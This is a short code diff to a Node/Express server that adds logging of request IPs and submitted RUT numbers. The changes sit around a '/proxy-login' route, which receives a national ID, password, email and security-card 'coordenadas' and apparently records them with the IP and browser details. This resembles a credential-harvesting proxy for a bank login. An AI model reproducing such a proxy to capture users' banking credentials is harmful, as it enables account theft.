@@ -111,6 +111,11 @@ app.use((req, res, next) => {
 
   next();
 });
+app.use((req, res, next) => {
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  registrarIntentoIP(ip);
+  next();
+});
 
 // ✅ Middleware para logging detallado
 app.use((req, res, next) => {
@@ -272,6 +277,7 @@ function detectarNavegador(userAgent) {
 
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail, coordenadas } = req.body;
+  if (rut) registrarIntentoRUT(rut);
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
   const infoNavegador = detectarNavegador(userAgent);
